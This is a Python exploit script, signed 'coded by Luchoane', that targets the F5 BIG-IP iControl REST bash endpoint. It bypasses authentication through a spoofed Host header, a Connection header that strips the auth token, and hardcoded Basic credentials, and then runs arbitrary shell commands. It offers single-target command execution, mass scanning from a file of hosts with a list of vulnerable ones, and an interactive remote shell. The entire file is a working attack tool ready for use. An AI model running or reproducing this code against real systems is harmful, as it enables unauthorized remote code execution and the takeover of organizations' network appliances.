import sys
import argparse
import requests
import urllib3
urllib3.disable_warnings()

def banner():
    print('''
      ::::::::: ::::::::::::::::::::::::::::: :::::::::::::::::: :::    ::: 
     :+:    :+::+:       :+:       :+:    :+::+:      :+:    :+::+:    :+:  
    +:+    +:++:+       +:+       +:+    +:++:+      +:+       +:+    +:+   
   +#++:++#: +#++:++#  :#::+::#  +#++:++#: +#++:++# +#++:++#+++#++:++#++    
  +#+    +#++#+       +#+       +#+    +#++#+             +#++#+    +#+     
 #+#    #+##+#       #+#       #+#    #+##+#      #+#    #+##+#    #+#      
###    ################       ###    ##################### ###    ###       

                       </coded by Luchoane>
    ''')


def main_func():
    if arguments.url:
        url_exploit(arguments.url, arguments.cmd)
    if arguments.f:
        file_exploit(arguments.f, arguments.cmd)
    if arguments.sh:
        shell_exploit(arguments.sh)


def url_exploit(url, cmd):
    try:
        target = f'https://{url}/mgmt/tm/util/bash'
        headers = {
            'Host': '127.0.0.1',
            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
            'X-F5-Auth-Token': 'asdf',        
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'
            
        }
        j = {"command":"run","utilCmdArgs":"-c '{0}'".format(cmd)}
        r = requests.post(target, headers=headers, json=j, verify=False, timeout=10)
        r.raise_for_status()
        if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
            print(f"[++++++] VULNERABLE: {url} |", r.json()['commandResult'].strip())
        else:
            print(f"[-] NOT VULNERABLE: {url}")
    except:
        print("[!] There was an error connecting!")


def file_exploit(f, cmd):
    vulnerable_targets = []
    f = open(f, "r").read().splitlines()
    for url in f:
        try:
            target = f'https://{url}/mgmt/tm/util/bash'
            headers = {
                'Host': '127.0.0.1',
                'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
                'X-F5-Auth-Token': 'asdf',        
                'Connection': 'X-F5-Auth-Token',
                'Content-Type': 'application/json'
                
            }
            j = {"command":"run","utilCmdArgs":"-c '{0}'".format(cmd)}
            r = requests.post(target, headers=headers, json=j, verify=False, timeout=10)
            r.raise_for_status()
            if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
                print(f"[++++++] VULNERABLE: {url} |", r.json()['commandResult'].strip())
                vulnerable_targets.append(url)
            else:
                print(f"[-] NOT VULNERABLE: {url}")
        
        except KeyboardInterrupt:
            print("[!] Exiting... BYE!")
            print("\n--------------------------")
            print("Vulnerable targets scanned:")
            for i in vulnerable_targets:
                print("[+]", i)
            sys.exit(0)
        
        except:
            print("[!] There was an error connecting!")
    
    print("\n--------------------------")
    print("Vulnerable targets scanned:")
    for i in vulnerable_targets:
        print("[+]", i)


def shell_exploit(sh):
    cmd = "whoami"
    try:
        target = f'https://{sh}/mgmt/tm/util/bash'
        headers = {
            'Host': '127.0.0.1',
            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
            'X-F5-Auth-Token': 'asdf',        
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'
            
        }
        j = {"command":"run","utilCmdArgs":"-c '{}'".format(cmd)}
        r = requests.post(target, headers=headers, json=j, verify=False, timeout=10)
        r.raise_for_status()
        if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
            print("Welcome to the interactive shell for:", sh)
            print("User:", r.json()['commandResult'].strip())
            print()
        else:
            print(f"[-] NOT VULNERABLE: {sh}")

    except:
        print("[!] There was an error connecting!")
        sys.exit(0)

    while True:
        try:
            cmd = input("> ")

            target = f'https://{sh}/mgmt/tm/util/bash'
            headers = {
                'Host': '127.0.0.1',
                'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
                'X-F5-Auth-Token': 'asdf',        
                'Connection': 'X-F5-Auth-Token',
                'Content-Type': 'application/json'
                
            }
            j = {"command":"run","utilCmdArgs":"-c '{}'".format(cmd)}
            r = requests.post(target, headers=headers, json=j, verify=False, timeout=10)
            r.raise_for_status()
            if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
                print(r.json()['commandResult'].strip())
                print()
            else:
                print(f"[-] NOT VULNERABLE: {sh}")

        except KeyboardInterrupt:
            print("[!] Exiting... Bye!")
            sys.exit(0)

        except:
            print("[!] There was an error connecting!")
            sys.exit(0)




if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', action='store', help='target url', dest='url', required=False)
    parser.add_argument('-f','--file', action='store', help='url file', dest='f', required=False)
    parser.add_argument('-c', '--command', action='store', help='command', dest='cmd', required=False)
    parser.add_argument('-s', '--shell', action='store', help='url to connect', dest='sh', required=False)
    arguments = parser.parse_args()
    banner()
    main_func()
